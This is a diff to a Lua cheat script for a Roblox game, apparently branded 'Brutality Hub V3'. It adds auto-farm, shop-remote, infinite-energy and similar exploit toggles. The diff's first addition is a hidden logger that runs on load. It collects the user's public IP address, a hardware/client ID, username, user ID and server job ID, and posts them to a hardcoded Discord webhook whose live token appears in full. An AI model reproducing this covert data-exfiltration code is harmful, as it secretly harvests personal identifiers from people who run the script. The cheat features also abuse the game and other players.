@@ -1,4 +1,71 @@
----[[Notify Má»›i LÃ m:))]]
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    local data =
+        request(
+        {
+            Url = Url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(message)
+        }
+    )
+    return ""
+end
+
+function AdminLoggerMsg()
+    AdminMessage = {
+        ["embeds"] = {
+            {
+                ["title"] = "**Detected User Brutality**",
+                ["description"] ="Use Brutality Hub V3",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xFFFF00), --kuning
+                ["fields"] = {
+                    {
+                        ["name"] = "**Username**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**UserID**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**PlaceID**",
+                        ["value"] = "```" .. game.PlaceId .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**IP Address**",
+                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**Hwid**",
+                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**JobID**",
+                        ["value"] = "```" .. game.JobId .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**Join Code**",
+                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
+                        ["inline"] = false
+                    }
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }
+        }
+    }
+    return AdminMessage
+end
+
+PostWebhook("https://discord.com/api/webhooks/1269384347979354134/bgJiCi1SUOqpMa2KuUnYHtWVHmCXUqzsvICP6haex9VTCkcM6AkDmLQHYK4AwdKeWLbF", AdminLoggerMsg()) -- Post to admin webhook
+
 local Notif = {}
 
 local CoreGUI = game:GetService("CoreGui")
@@ -115,7 +182,7 @@ function Notif.New(text, timee)
     uicorner_2.CornerRadius = UDim.new(0, 5)
     uicorner_2.Parent = text_button
 
-    local image_button = Instance.new("ImageButton")
+    local image_button = Instance.new("ImageButton") --disini1
     image_button.Image = "rbxassetid://16058297648"
     image_button.ImageColor3 = Color3.new(0.784314, 0.784314, 0.784314)
     image_button.ImageRectOffset = Vector2.new(924, 724)
@@ -189,7 +256,7 @@ ImageButton1.BorderSizePixel = 0
 ImageButton1.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
 ImageButton1.Size = UDim2.new(0, 50, 0, 50)
 ImageButton1.Draggable = true
-ImageButton1.Image = "rbxassetid://16058297648"
+ImageButton1.Image = "rbxassetid://16058297648" --disini2
 ImageButton1.MouseButton1Down:connect(function()
 game:GetService("VirtualInputManager"):SendKeyEvent(true,305,false,game)
 game:GetService("VirtualInputManager"):SendKeyEvent(false,305,false,game)
@@ -3828,7 +3895,7 @@ local RaceV4 = Library:AddTab("Trial V4","18477916271")
 local P = Library:AddTab("Bounty","18492098759")
 local R = Library:AddTab("Auto Raid","18491947999")
 local T = Library:AddTab("Teleport","18477347703")
-local S = Library:AddTab("Shop Dealer","18477410455")
+local S = Library:AddTab("Shop","18477410455")
 local D = Library:AddTab("Devil Fruit","18477363100")
 local Mh = Library:AddTab("Mod Hack","18797339934")
 local Misc = Library:AddTab("MISC","18477908150")
@@ -3907,7 +3974,7 @@ task.spawn(function()
     end)
 
 local AttackList = {"0", "0.1", "0.15", "0.155", "0.16", "0.165", "0.17", "0.175", "0.18", "0.185"}
-_G.FastAttackDelay = "0.1"
+_G.FastAttackDelay = "0.175"
 Main:AddDropdown("Fast Attack Delay", AttackList,function(MakoGay)
     _G.FastAttackDelay = MakoGay
 end)
@@ -7228,26 +7295,8 @@ spawn(function()
         end)
     end
 end)
-
-M:AddToggle("Speed Boat (Auto ngibrit wak)",_G.Speed,function(state)
-    _G.Speed = Value
-    end)
-    
-spawn(function()
-game:GetService("RunService").RenderStepped:Connect(function()
-    if _G.Speed then
-         pcall(function()
-    for _,v in next, game.Workspace.Boats.PirateBrigade:GetDescendants() do
-    if v.Name:find("VehicleSeat") then
-                    v.MaxSpeed = 300
-                    end
-                 end
-        end)
-    end
-end)
-end)
 --[[
-M:AddToggle("Buy Boat + Auto Finish Zone 5",_G.dao,function(state)
+M:AddToggle("Auto Finish Zone 5 (fix bug)",_G.dao,function(state)
     _G.dao = state
     end)
 
@@ -7273,7 +7322,7 @@ M:AddToggle("Buy Boat + Auto Finish Zone 5",_G.dao,function(state)
             end
         end)
 ]]
-M:AddToggle("Speed Boat (auto ngibrit cuy)",_G.Speed,function(state)
+M:AddToggle("Speed Boat (semi work)",_G.Speed,function(value) -- state
 _G.Speed = Value
 end)
             
@@ -10886,7 +10935,7 @@ venyx:Notify("Unlocked")
 if game:GetService("Workspace").Map["Temple of Time"].Lever.Prompt:FindFirstChild("ProximityPrompt") then
     game:GetService("Workspace").Map["Temple of Time"].Lever.Prompt:FindFirstChild("ProximityPrompt"):Remove()
 else
---[[]]
+
 end
 wait(0.1)
 local ProximityPrompt = Instance.new("ProximityPrompt")
@@ -11281,7 +11330,7 @@ end
         game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PlayerHunter")
     end)
     
-    P:AddToggle("Player Hunt er[Wait Update]",false,function(value)
+    P:AddToggle("Player Hunter [fix bug]",false,function(value)
         _G.AutoPlayerHunter = value
     StopTween(_G.AutoPlayerHunter)
     end)
@@ -12613,6 +12662,14 @@ end)
     S:AddButton("Buy God Human | $5,000 Frag | $5,000,000  ",function()
         game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
     end)
+
+    S:AddButton("Buy Sanguine Art | $5,000 Frag | $5,000,000  ",function()
+        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySanguineArt")
+    end)
+
+    S:AddButton("Buy DivineArt (Update) | $7,500 Frag | $7,500,000  ",function()
+        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDivineArt")
+    end)
     -----Shop----------------
     
     S:AddSeperator(" Sword ")
@@ -12732,7 +12789,19 @@ end)
     
     ------------Stat------------------
     
-    S:AddSeperator("Fragments")
+    S:AddSeperator("Reset Stats & Race")
+
+    S:AddButton("Buy Race Ghoul", function()            
+    local S = {[1] = "Ectoplasm", [2] = "BuyCheck", [3] = 4}
+        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(S))
+        local S = {[1] = "Ectoplasm", [2] = "Change", [3] = 4}
+        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(S))
+        end)
+
+S:AddButton("Buy Race Cyborg", function()
+    local S = {[1] = "CyborgTrainer", [2] = "Buy"}
+    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(S))
+end)
 
 S:AddButton("Reset Stats (Use 2.5K Fragments)", function()
     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","1")
@@ -13179,7 +13248,7 @@ end)
     end)
 
 
-    Misc:AddSeperator("Server")
+    Misc:AddSeperator("Join Webhook")
     
     Misc:AddButton("Rejoin Server",function()
         game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
@@ -14136,7 +14205,72 @@ end)
             end)
         end
     end)
+
+    Mh:AddToggle("Infinite Energy",_G.InfinitsEnergy,function(value)
+        _G.InfinitsEnergy = value
+INGENG()
+end)
+
+local LocalPlayer = game:GetService'Players'.LocalPlayer
+local originalstam = LocalPlayer.Character.Energy.Value
+function INGENG()
+    game:GetService'Players'.LocalPlayer.Character.Energy.Changed:connect(function()
+        if _G.InfinitsEnergy then
+            LocalPlayer.Character.Energy.Value = originalstam
+        end 
+    end)
+end
+
+Mh:AddToggle("Infinite Ability",_G.InfiniteAbility,function(value)
+    InfiniteAbility = value
+end)
     
+spawn(function()
+    while wait() do
+        if InfiniteAbility then
+            InfAb()
+        end
+    end
+end)
+
+function InfAb()
+    if InfiniteAbility then
+        if not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility") then
+            local inf = Instance.new("ParticleEmitter")
+            inf.Acceleration = Vector3.new(0,0,0)
+            inf.Archivable = true
+            inf.Drag = 20
+            inf.EmissionDirection = Enum.NormalId.Top
+            inf.Enabled = true
+            inf.Lifetime = NumberRange.new(0.2,0.2)
+            inf.LightInfluence = 0
+            inf.LockedToPart = true
+            inf.Name = "Agility"
+            inf.Rate = 500
+            local numberKeypoints2 = {
+                NumberSequenceKeypoint.new(0, 0); 
+                NumberSequenceKeypoint.new(1, 4); 
+            }
+
+            inf.Size = NumberSequence.new(numberKeypoints2)
+            inf.RotSpeed = NumberRange.new(999, 9999)
+            inf.Rotation = NumberRange.new(0, 0)
+            inf.Speed = NumberRange.new(30, 30)
+            inf.SpreadAngle = Vector2.new(360,360)
+            inf.Texture = "rbxassetid://243098098"
+            inf.VelocityInheritance = 0
+            inf.ZOffset = 2
+            inf.Transparency = NumberSequence.new(0)
+            inf.Color = ColorSequence.new(Color3.fromRGB(0, 255, 255),Color3.fromRGB(0, 255, 255))
+            inf.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+        end
+    else
+        repeat wait()
+            game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility"):Destroy()
+        until not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility")
+    end
+end
+
     Mh:AddToggle("Walk on Water",true,function(value)
         _G.WalkWater = value
     end)
@@ -14168,6 +14302,7 @@ end)
             end
         end
     end)
+
     
     Mh:AddButton("Remove Lave",function()
 		for i,v in pairs(game.Workspace:GetDescendants()) do
